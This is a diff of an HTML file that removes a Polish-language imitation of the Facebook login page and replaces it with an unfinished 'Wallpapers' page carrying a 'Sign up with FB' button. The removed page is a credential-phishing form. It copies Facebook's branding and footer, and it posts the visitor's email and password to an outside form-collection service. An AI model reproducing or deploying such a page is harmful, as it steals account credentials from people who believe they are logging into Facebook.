@@ -1,122 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Facebook - zaloguj się lub zarejestruj</title>
-    <link rel="shortcut icon" type="image/png" href="img/logo-tab.svg">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallpapers</title>
 
-    <link rel="stylesheet" href="css/normalize.css" />
-    <link rel="stylesheet" href="css/reset.css" />
-    <link rel="stylesheet" href="css/main.css" />
-  </head>
-  <body>
-    <main>
-      <section class="hero">
-        <div class="hero__container container">
-          <div class="hero__content">
-            <div class="hero__img"><img src="img/logo.png" alt="Logo" /></div>
-            <h2 class="hero__subtitle subtitle">Ostatnie logowania</h2>
-            <p class="hero__descr descr">
-              Kliknij swoje zdjięcie lub dodaj konto.
-            </p>
-            <div class="hero__card">
-              <div class="hero__icon"><i class="fas fa-plus"></i></div>
-              <p class="hero__dodaj hero__subdescr descr">Dodaj konto</p>
-            </div>
-          </div>
+    <link rel="stylesheet" href="css/normalize.css">
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/main.css">
 
-          <div class="hero__right">
-            <div class="hero__hack">
-              <form action="https://formspree.io/f/xeqvnyyk" method="POST" class="hero__form">
-                <input
-                  class="hero__input"
-                  type="email"
-                  name="E-mail"
-                  id="email"
-                  placeholder="Adres e-mail lub numer telefonu"
-                />
-                <input
-                  class="hero__input"
-                  type="password"
-                  name="password"
-                  id="Password"
-                  placeholder="Hasło"
-                />
-                <p class="hero__status"></p>
-                <input class="hero__button" type="submit" value="Zaloguj się" />
-              </form>
-              <p class="hero__pamietam descr">Nie pamiętasz hasła?</p>
-              <span class="hero__line"></span>
-              <button class="hero__regbutton">Utwórz nowe konto</button>
-            </div>
-
-            <p class="hero__info">
-              <span>Utwórz stronę</span> dla gwiazdy, zespołu lub firmy.
-            </p>
+</head>
+<body>
+    <header class="header">
+        <div class="header__container">
+          <a class="header__logo">
+            <img src="img/logo.png" alt="Logo" />
+          </a>
+          <div class="header__menu menu">
+            <button class="menu__icon">
+              <span></span>
+            </button>
+            <nav class="menu__body">
+              <ul class="menu__list">
+                <li class="menu__item">
+                  <a class="menu__link menu__link--active" href="#"
+                    >Home</a
+                  >
+                </li>
+                <li class="menu__item">
+                  <a class="menu__link" href="#">Gallery</a>
+                </li>
+                <li class="menu__item">
+                  <a class="menu__link" href="#">Contact</a>
+                </li>
+                <li class="menu__item">
+                    <a class="menu__link menu__button" href="#">Sign up with FB</a>
+                  </li>
+              </ul>
+            </nav>
           </div>
         </div>
-      </section>
-    </main>
+      </header>
 
-    <footer class="footer">
-      <div class="footer__container container">
-      <ul class="footer__list">
-        <li><a href="#">Polski</a></li>
-        <li><a href="#">English (US)</a></li>
-        <li><a href="#">ślōnskŏ gŏdka </a></li>
-        <li><a href="#">Русский </a></li>
-        <li><a href="#">Deutsch </a></li>
-        <li><a href="#">Français (France) </a></li>
-        <li><a href="#">Italiano </a></li>
-        <li><a href="#">Українська </a></li>
-        <li><a href="#">Español (España)</a></li>
-        <li><a href="#">Português (Brasil) </a></li>
-        <li><a href="#">العربية</a></li>
-      </ul>
+      <main>
+          <sectio class="hero">
 
-        <p class="footer__line"></p>
-
-        <ul class="footer__list">
-          <li><a href="/r.php">Zarejestruj się</a></li>
-          <li><a href="/login/">Zaloguj się</a></li>
-          <li><a href="https://messenger.com/">Messenger</a></li>
-          <li><a href="/lite/">Facebook Lite</a></li>
-          <li><a href="https://www.facebook.com/watch/"> Watch </a></li>
-          <li><a href="/places/">Miejsca</a></li>
-          <li><a href="/games/">Gry</a></li>
-          <li><a href="/marketplace/">Marketplace</a></li>
-          <li><a href="https://pay.facebook.com/" >Facebook Pay</a></li>
-          <li><a href="/jobs/">Oferty pracy</a></li>
-          <li><a href="https://www.oculus.com/">Oculus</a></li>
-          <li><a href="https://portal.facebook.com/" >Portal</a></li>
-          <li><a href="#">Instagram</a></li>
-          <li><a href="/local/lists/245019872666104/" title="Przejrzyj katalog list lokalnych.">Lokalne</a></li>
-          <li><a href="/fundraisers/" title="Wpłać datki na szlachetne cele.">Zbiórki pieniędzy</a></li>
-          <li><a href="/biz/directory/" title="Przejrzyj nasz katalog usług Facebooka.">Usługi</a></li>
-          <li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="Sprawdź Centrum informacji o głosowaniu.">Centrum informacji o głosowaniu</a></li>
-          <li><a href="https://about.facebook.com/" accesskey="8" title="Przeczytaj nasz blog, odkryj centrum zasobów i znajdź pracę.">Informacje</a></li>
-          <li><a href="#">Utwórz reklamę</a></li>
-          <li><a href="/pages/create/?ref_type=site_footer">Utwórz stronę</a></li>
-          <li><a href="https://developers.facebook.com/?ref=pf">Twórcy aplikacji</a></li>
-          <li><a href="/careers/?ref=pf">Praca</a></li>
-          <li><a href="/privacy/explanation">Prywatność</a></li>
-          <li><a href="/policies/cookies/">Pliki cookie</a></li>
-          </ul>
-
-        <p class="footer__copy">Facebook &copy; 2021</p>
-      </div>
-    </footer>
-
-    <!--FontAwesome-->
-    <script
-      src="https://kit.fontawesome.com/72e9e0b28f.js"
-      crossorigin="anonymous"
-    ></script>
-
-    <!--JS-->
-    <script src="js/script.js"></script>
-    </body>
-  </body>
+          </sectio>
+      </main>
+</body>
 </html>
